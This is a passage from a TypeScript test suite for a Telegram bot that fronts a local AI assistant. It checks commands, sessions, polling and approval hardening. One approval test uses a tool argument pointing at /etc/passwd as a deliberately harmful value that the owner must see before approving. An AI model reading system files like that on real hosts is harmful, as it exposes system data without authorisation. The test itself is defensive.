    });

    test('/agents reports an unavailable research backend instead of fabricating an answer', async () => {
      await harness.cleanup();
      await setup({ harness: { search: { searchDetailed: async () => ({ source: 'none', results: [], unavailableReason: 'SearXNG is unreachable' }) } } });
      await say('/agents what is new in battery chemistry');
      const text = lastText();
      assert.match(text, /Multi-agent result: unavailable/);
      assert.match(text, /unreachable|unavailable/i);
    });

    test('/eval runs the harness and reports the result', async () => {
      harness.rt.evalHarness.runAll = async () => ({ totalTests: 2, passedTests: 1, accuracyRate: 0.5, meetsTarget: false, avgLatencyMs: 12, erroredTests: 0, aborted: false, results: [{ testId: 't1', category: 'reasoning', passed: false, score: 0, latencyMs: 12, output: '' }, { testId: 't2', category: 'retrieval', passed: true, score: 1, latencyMs: 12, output: '' }] });
      await say('/eval');
      assert.match(lastText(), /1\/2 passed \(50%\), below the 90% target/);
      assert.match(lastText(), /failed t1/);
    });

    test('/email says no transport is configured and lists nothing it does not have', async () => {
      await say('/email');
      assert.match(lastText(), /No mail transport is configured/);
      assert.match(lastText(), /No emails stored/);
    });

    test('/phone does not invent a device', async () => {
      await say('/phone');
      assert.match(lastText(), /No phone is reported/);
    });
  });

  describe('benchmark', () => {
    const card = (model: string): ModelBenchmarkScorecard => ({
      modelName: model,
      status: 'complete',
      overallScore: 88,
      grade: 'B+',
      answeredCases: 4,
      erroredCases: 0,
      totalLatencyMs: 4000,
      avgLatencyMs: 1000,
      avgWarmLatencyMs: 700,
      avgLoadMs: 300,
      decodeTokensPerSec: 42,
      estimatedTokensPerSec: 42,
      tokensPerSecSource: 'backend',
      categories: { reasoning: { category: 'reasoning', passed: 3, total: 4, percentage: 75, avgLatencyMs: 1000 } },
      results: [],
      recommendedLanes: ['resident'],
      timestamp: '2026-01-01T00:00:00.000Z',
      systemSpecs: { platform: 'test', freeMemoryGB: 10, totalMemoryGB: 31 },
    });

    beforeEach(() => setup({ harness: { fetchInventory: async () => fakeOllama(['qwen3:8b', 'qwen3:14b']) } }));

    test('runs on the active model through the single-flight runner and reports the real card', async () => {
      const models: string[] = [];
      harness.rt.benchmark.suite.runExclusive = async (p) => {
        models.push(p.getModel());
        return card('qwen3:8b');
      };
      await say('/benchmark');
      assert.equal(models.length, 1);
      assert.match(lastText(), /Benchmark of qwen3:8b/);
      assert.match(lastText(), /Score: 88% \(grade B\+\)/);
      assert.match(lastText(), /42 decode tokens\/s/);
      assert.match(lastText(), /average load 300 ms/);
    });

    test('refuses a model that is not installed instead of printing a failing grade', async () => {
      let ran = false;
      harness.rt.benchmark.suite.runExclusive = async () => {
        ran = true;
        return card('x');
      };
      await say('/benchmark qwen2.5:7b');
      assert.match(lastText(), /not installed/);
      assert.equal(ran, false);
    });

    test('says so when another benchmark is already running', async () => {
      const release = harness.rt.benchmark.guard.tryAcquire('web: qwen3:8b');
      assert.ok(release);
      await say('/benchmark');
      assert.match(lastText(), /already running/);
      release();
    });
  });

  describe('memory and sessions', () => {
    beforeEach(() => setup());

    test('/memory shows profile facts and vault labels, never the secret', async () => {
      const owner = harness.rt.ownerUserId;
      await harness.rt.memory.setProfileFact(owner, 'favourite_colour', 'green', 'preference');
      await harness.rt.memory.storeSensitive(owner, 'wifi-password', 'hunter2-very-secret');
      await say('/memory');
      const text = lastText();
      assert.match(text, /favourite_colour: green/);
      assert.match(text, /wifi-password/);
      assert.doesNotMatch(text, /hunter2-very-secret/);
    });

    test('/forget removes a profile fact and a vault entry', async () => {
      const owner = harness.rt.ownerUserId;
      await harness.rt.memory.setProfileFact(owner, 'nickname', 'J', 'preference');
      await say('/forget nickname');
      assert.match(lastText(), /Forgot "nickname"/);
      assert.deepEqual(await harness.rt.memory.getProfileFacts(owner), []);
      await say('/forget nickname');
      assert.match(lastText(), /Nothing is stored/);
    });

    test('"remember that ..." is stored by the pipeline as a profile fact', async () => {
      await say('Remember that my favourite editor is vim');
      const facts = await harness.rt.memory.getProfileFacts(harness.rt.ownerUserId);
      assert.ok(facts.some((fact) => fact.value.includes('vim')));
    });

    test('/new, /sessions, /switch and /delete manage the active session', async () => {
      const owner = harness.rt.ownerUserId;
      await say('/new Automation_Plan');
      assert.match(lastText(), /Created and switched to session \*Automation\\_Plan\*/);
      const [created] = await harness.rt.sessions.listSessions(owner);
      assert.equal((await harness.rt.sessions.getActiveSession(owner, 'telegram'))?.id, created.id);

      await say('/new Second');
      await say('/sessions');
      assert.match(lastText(), /1\. \*Second\* \(active\)/);
      assert.match(lastText(), /2\. \*Automation\\_Plan\*/);

      await say('/switch 2');
      assert.equal((await harness.rt.sessions.getActiveSession(owner, 'telegram'))?.id, created.id);
      await say('/delete 1');
      assert.match(lastText(), /Deleted session "Second"/);
      await say('/switch nope');
      assert.match(lastText(), /Session not found/);
    });

    test('deleting the active session elsewhere starts a fresh Telegram session on the next message', async () => {
      await say('Hello');
      const owner = harness.rt.ownerUserId;
      const [first] = await harness.rt.sessions.listSessions(owner);
      await harness.rt.sessions.deleteSession(owner, first.id);
      await say('Hello again');
      const sessions = await harness.rt.sessions.listSessions(owner);
      assert.equal(sessions.length, 1);
      assert.notEqual(sessions[0].id, first.id);
    });

    test('a session started on the web is continued on Telegram with /switch, and the history is visible', async () => {
      const owner = harness.rt.ownerUserId;
      const web = await harness.rt.sessions.createSession(owner, 'Web chat');
      await harness.rt.sessions.addMessage(owner, web.id, { role: 'user', content: 'My dog is called Rex.' });
      await harness.rt.sessions.addMessage(owner, web.id, { role: 'assistant', content: 'Nice name.' });
      await say(`/switch ${web.id}`);
      await say('What is my dog called?');
      assert.match(provider.calls[0].prompt, /My dog is called Rex\./);
    });
  });

  describe('polling', () => {
    beforeEach(() => setup());

    test('each update is handled once, the offset moves past it first, and stopPolling aborts a poll that is waiting', async () => {
      const handled: number[] = [];
      bot.handleUpdate = async (update) => {
        handled.push(update.update_id);
      };
      const offsets: number[] = [];
      let call = 0;
      bot.getUpdates = async (offset, _timeout, signal) => {
        offsets.push(offset ?? -1);
        call += 1;
        if (call === 1) return [{ update_id: 5 }];
        // Telegram can redeliver an update that was not confirmed yet.
        if (call === 2) return [{ update_id: 5 }, { update_id: 6 }];
        return new Promise((_, reject) => signal?.addEventListener('abort', () => reject(new Error('aborted')), { once: true }));
      };
      const polling = bot.startPolling(0);
      await waitFor(() => call === 3);
      assert.deepEqual(handled, [5, 6]);
      assert.deepEqual(offsets, [0, 6, 7]);
      bot.stopPolling();
      await polling;
    });

    test('the poll offset is saved, so a restart does not replay handled updates', async () => {
      bot.handleUpdate = async () => {};
      let call = 0;
      bot.getUpdates = async (_offset, _timeout, signal) => {
        call += 1;
        if (call === 1) return [{ update_id: 41 }];
        return new Promise((_, reject) => signal?.addEventListener('abort', () => reject(new Error('aborted')), { once: true }));
      };
      const polling = bot.startPolling(0);
      await waitFor(() => call === 2);
      bot.stopPolling();
      await polling;

      const restarted = new TelegramBotClient({ token: 'mock-test-token', ownerId: OWNER_TG_ID, runtime: harness.rt });
      restarted.apiCall = bot.apiCall;
      const seen: Array<number | undefined> = [];
      restarted.getUpdates = async (offset, _timeout, signal) => {
        seen.push(offset);
        return new Promise((_, reject) => signal?.addEventListener('abort', () => reject(new Error('aborted')), { once: true }));
      };
      const second = restarted.startPolling(0);
      await waitFor(() => seen.length === 1);
      assert.deepEqual(seen, [42]);
      restarted.stopPolling();
      await second;
    });

    test('a long turn in the update handler does not stop polling', async () => {
      let release: () => void = () => {};
      const slow = new Promise<void>((resolve) => {
        release = resolve;
      });
      const handled: number[] = [];
      bot.handleUpdate = async (update) => {
        handled.push(update.update_id);
        if (update.update_id === 1) await slow;
      };
      let call = 0;
      bot.getUpdates = async (_offset, _timeout, signal) => {
        call += 1;
        if (call === 1) return [{ update_id: 1 }];
        if (call === 2) return [{ update_id: 2 }];
        return new Promise((_, reject) => signal?.addEventListener('abort', () => reject(new Error('aborted')), { once: true }));
      };
      const polling = bot.startPolling(0);
      await waitFor(() => call === 3);
      assert.deepEqual(handled, [1, 2], 'update 2 was handled while update 1 was still running');
      bot.stopPolling();
      await polling;
      release();
      await bot.idle();
    });

    test('a poll failure backs off instead of spinning, and stopPolling interrupts the wait', async () => {
      let calls = 0;
      bot.getUpdates = async () => {
        calls += 1;
        throw new Error('network down');
      };
      const polling = bot.startPolling(0);
      await waitFor(() => calls >= 1);
      await settle(50);
      assert.equal(calls, 1, 'no immediate retry loop');
      bot.stopPolling();
      await polling;
    });

    test('getUpdates asks for a long poll and gives the HTTP request more time than the poll', async () => {
      const calls: Array<{ body: any; options: any }> = [];
      bot.apiCall = async <T>(_method: string, body?: Record<string, unknown>, options?: unknown): Promise<T> => {
        calls.push({ body, options });
        return [] as T;
      };
      await bot.getUpdates(10, 25);
      assert.equal(calls[0].body.timeout, 25);
      assert.deepEqual(calls[0].body.allowed_updates, ['message', 'callback_query']);
      assert.ok(calls[0].options.timeoutMs > 25_000);
    });
  });

  describe('hardening', () => {
    const quietPoll = (_offset?: number, _timeout?: number, signal?: AbortSignal): Promise<TelegramUpdate[]> =>
      new Promise((_, reject) => signal?.addEventListener('abort', () => reject(new Error('aborted')), { once: true }));
    const webNotifierCalls: string[] = [];

    /** Stands in for the web server's no-op notifier, which `setup` would otherwise have replaced. */
    function installWebNotifier(): void {
      webNotifierCalls.length = 0;
      harness.rt.approvals.setNotifier(async (request) => {
        webNotifierCalls.push(request.id);
      });
    }

    function withGetMe(result: () => unknown): void {
      const inner = bot.apiCall;
      bot.apiCall = async <T>(method: string, body?: Record<string, unknown>, options?: unknown): Promise<T> => {
        if (method === 'getMe') return result() as T;
        return inner.call(bot, method, body, options as never) as Promise<T>;
      };
    }

    async function startVerified(username = 'jarvis_bot', id = 777): Promise<{ polling: Promise<void> }> {
      withGetMe(() => ({ id, username }));
      bot.getUpdates = quietPoll;
      const polling = bot.startPolling(0);
      await settle(20);
      return { polling };
    }

    test('a bot with no owner never replaces the web notifier, so web approvals stay pending', async () => {
      await setup({ ownerId: '' });
      installWebNotifier();
      assert.equal(bot.registerApprovalNotifier(), false);
      const pending = harness.rt.approvals.request({ id: 'web-1', actionType: 'TOOL_CALL', description: 'x', tier: 2, requestedBy: 'web' });
      await settle();
      assert.deepEqual(webNotifierCalls, ['web-1']);
      assert.equal(harness.rt.approvals.pending().length, 1);
      harness.rt.approvals.resolve('web-1', true, 'web');
      assert.equal((await pending).approved, true);
    });

    test('a rejected token never registers the notifier and stops polling', async () => {
      await setup();
      installWebNotifier();
      withGetMe(() => {
        throw new TelegramApiError('getMe', 'Unauthorized', 401);
      });
      await bot.startPolling(0);
      const pending = harness.rt.approvals.request({ id: 'web-2', actionType: 'TOOL_CALL', description: 'x', tier: 2, requestedBy: 'web' });
      await settle();
      assert.deepEqual(webNotifierCalls, ['web-2']);
      assert.equal(messages().length, 0);
      harness.rt.approvals.resolve('web-2', false, 'web');
      await pending;
    });

    test('a verified bot with an owner becomes the approval channel after getMe', async () => {
      await setup();
      installWebNotifier();
      const { polling } = await startVerified();
      const pending = harness.rt.approvals.request({ id: 'tg-1', actionType: 'TOOL_CALL', description: 'x', tier: 2, requestedBy: 'web' });
      await waitFor(() => messages().length > 0);
      assert.deepEqual(webNotifierCalls, []);
      harness.rt.approvals.resolve('tg-1', false, 'test');
      await pending;
      bot.stopPolling();
      await polling;
    });

    test('a stopped bot leaves the web notifier in place, so later web approvals are not denied at once', async () => {
      await setup();
      installWebNotifier();
      const { polling } = await startVerified();
      bot.stopPolling();
      await polling;
      const pending = harness.rt.approvals.request({ id: 'web-after-stop', actionType: 'TOOL_CALL', description: 'x', tier: 2, requestedBy: 'web' });
      await settle();
      assert.deepEqual(webNotifierCalls, ['web-after-stop']);
      assert.equal(harness.rt.approvals.pending().length, 1);
      harness.rt.approvals.resolve('web-after-stop', true, 'web');
      assert.equal((await pending).approved, true);
    });

    test('a forwarded command is plain content, not an owner command', async () => {
      await setup();
      await harness.rt.killSwitch.trigger('test', 'halt');
      await bot.handleUpdate(message('/resume', OWNER_TG, { forward_origin: { type: 'user' }, forward_date: 1 }));
      assert.equal(harness.rt.killSwitch.isKilled(), true);
      await bot.handleUpdate(message('/resume', OWNER_TG, { forward_from: { id: 5, is_bot: false, first_name: 'X' } }));
      assert.equal(harness.rt.killSwitch.isKilled(), true);
      await say('/resume');
      assert.equal(harness.rt.killSwitch.isKilled(), false);
    });

    test('a command addressed to another bot is ignored, one addressed to this bot runs', async () => {
      await setup();
      const { polling } = await startVerified('jarvis_bot');
      sent = [];
      await say('/kill@some_other_bot');
      assert.equal(harness.rt.killSwitch.isKilled(), false);
      assert.equal(messages().length, 0, 'no reply to a command meant for another bot');
      await say('/status@Jarvis_Bot');
      assert.match(lastText(), /Jarvis status/);
      assert.equal(parseCommand('/kill@x y')?.target, 'x');
      assert.equal(parseCommand('/kill y')?.target, undefined);
      bot.stopPolling();
      await polling;
    });

    test('/research is not downgraded to an ensemble answer when ensemble mode is on', async () => {
      await setup({
        harness: {
          search: { searchDetailed: async () => searchOk(['https://a.example/one']) },
          distiller: { fetchTopResults: async () => [page('https://a.example/one', 'The sky is blue because of Rayleigh scattering.')] },
        },
        scripts: [{ chunks: ['Rayleigh scattering.'] }],
      });
      await say('/ensemble on');
      await say('/research why is the sky blue');
      assert.doesNotMatch(texts().join('\n'), /Ensemble: asking/);
      assert.match(texts().join('\n'), /Sources:\n- https:\/\/a\.example\/one/);
    });

    test('the approval prompt shows the whole action, split across messages, with the buttons on the last part', async () => {
      await setup();
      const tail = 'TAIL-ARGUMENT-/etc/passwd';
      const description = `Run tool 'x' with {"a":"${'b'.repeat(5000)}","path":"${tail}"}`;
      const pending = harness.rt.approvals.request({ id: 'big-1', actionType: 'TOOL_CALL', description, tier: 2, requestedBy: 'tool', metadata: { tool: 'x' } });
      await waitFor(() => messages().length >= 2);
      const parts = messages();
      assert.ok(parts.every((call) => String(call.body.text).length <= 4000));
      const joined = parts.map((call) => String(call.body.text)).join('\n');
      assert.ok(joined.includes(tail), 'the harmful tail is visible to the owner');
      assert.equal(joined.replace(/\n/g, '').split('b'.repeat(100)).length > 40, true);
      assert.deepEqual(parts.slice(0, -1).map((call) => call.body.reply_markup), parts.slice(0, -1).map(() => undefined));
      assert.ok(parts.at(-1)?.body.reply_markup?.inline_keyboard[0].length === 2);
      assert.match(String(parts.at(-1)?.body.text), /Nothing runs unless you tap Approve/);
      harness.rt.approvals.resolve('big-1', false, 'test');
      await pending;
    });

    test('a saved poll offset is only used for the bot that saved it', async () => {
      await setup();
      bot.handleUpdate = async () => {};
      bot.getUpdates = async (_o, _t, signal) => {
        bot.getUpdates = quietPoll;
        void signal;
        return [{ update_id: 41 }];
      };
      withGetMe(() => ({ id: 111, username: 'a' }));
      const first = bot.startPolling(0);
      await settle(30);
      bot.stopPolling();
      await first;

      async function offsetSeenBy(id: number): Promise<number | undefined> {
        const other = new TelegramBotClient({ token: `${id}:secret`, ownerId: OWNER_TG_ID, runtime: harness.rt });
        other.apiCall = async <T>() => ({ id, username: 'x' }) as T;
        const seen: Array<number | undefined> = [];
        other.getUpdates = async (offset, _t, signal) => {
          seen.push(offset);
          return quietPoll(undefined, undefined, signal);
        };
        const polling = other.startPolling(0);
        await waitFor(() => seen.length === 1);
        other.stopPolling();
        await polling;
        return seen[0];
      }
      assert.equal(await offsetSeenBy(222), 0, 'a different bot starts from its own offset');
      assert.equal(await offsetSeenBy(111), 42, 'the same bot resumes');
    });

    test('/switch and /delete numbers refer to the list /sessions last showed, even after the order changed', async () => {
      await setup();
      const owner = harness.rt.ownerUserId;
      await say('/new One');
      await say('/new Two');
      await say('/sessions');
      assert.match(lastText(), /1\. \*Two\*/);
      await harness.rt.sessions.createSession(owner, 'Three');
      const [newest] = await harness.rt.sessions.listSessions(owner);
      assert.equal(newest.title, 'Three', 'the live list has moved on');
      await say('/delete 2');
      assert.match(lastText(), /Deleted session "One"/);
      const titles = (await harness.rt.sessions.listSessions(owner)).map((session) => session.title).sort();
      assert.deepEqual(titles, ['Three', 'Two']);
    });

    test('a session number with no /sessions list behind it is refused instead of guessed', async () => {
      await setup();
      await say('/new One');
      await say('/delete 1');
      assert.match(lastText(), /Send \/sessions first/);
      assert.equal((await harness.rt.sessions.listSessions(harness.rt.ownerUserId)).length, 1);
    });

    test('/id prints the real settings path with its backslashes', async () => {
      await setup({ ownerId: '' });
      await say('/id', STRANGER_TG);
      assert.ok(lastText().includes('%USERPROFILE%\\.jarvis\\settings.env'));
      assert.ok(lastText().includes(`TELEGRAM_OWNER_ID=${STRANGER_TG}`));
    });

    test('splitMessage never cuts a surrogate pair or a grapheme cluster', async () => {
      await setup();
      const smiley = 'a'.repeat(3999) + '\u{1F600}' + 'b'.repeat(10);
      const family = 'a'.repeat(3995) + '\u{1F468}‍\u{1F469}‍\u{1F467}' + 'b'.repeat(10);
      for (const text of [smiley, family]) {
        const chunks = bot.splitMessage(text, 4000);
        assert.ok(chunks.length >= 2);
        assert.ok(chunks.every((chunk) => chunk.length <= 4000 && chunk.isWellFormed()));
        assert.equal(chunks.join(''), text);
      }
      assert.ok(bot.splitMessage(family, 4000)[1].startsWith('\u{1F468}‍\u{1F469}‍\u{1F467}'));
      const lines = ['x'.repeat(3000), 'y'.repeat(3000)].join('\n');
      assert.deepEqual(bot.splitMessage(lines, 4000), ['x'.repeat(3000), 'y'.repeat(3000)], 'prefers newline boundaries');
    });

    test('a failed answerCallbackQuery does not stop the message edit or report a failure', async () => {
      await setup();
      const pending = harness.rt.approvals.request({ id: 'cb-1', actionType: 'TOOL_CALL', description: 'x', tier: 2, requestedBy: 'x' });
      await waitFor(() => messages().length > 0);
      bot.answerCallbackQuery = async () => {
        throw new TelegramApiError('answerCallbackQuery', 'Bad Request: query is too old', 400);
      };
      sent = [];
      await bot.handleUpdate({ update_id: 9, callback_query: { id: 'old', from: { id: OWNER_TG, is_bot: false, first_name: 'O' }, data: 'ap:1:cb-1', message: { message_id: 5, chat: { id: OWNER_TG, type: 'private' }, date: 0 } } });
      assert.equal((await pending).approved, true);
      assert.match(String(sent.find((call) => call.method === 'editMessageText')?.body.text), /APPROVED by you/);
      assert.doesNotMatch(texts().join('\n'), /Something went wrong/);
    });
  });

  describe('formatting', () => {
    beforeEach(() => setup());

    test('bot-authored messages are Markdown with dynamic values escaped; nothing from a model is parsed as Markdown', async () => {
      await say('/new Plan_A*');
      const created = messages().at(-1);
      assert.equal(created?.body.parse_mode, 'Markdown');
      assert.match(String(created?.body.text), /\*Plan\\_A\\\*\*/);
      await say('hello');
      assert.equal(messages().at(-1)?.body.parse_mode, undefined);
    });
  });
});
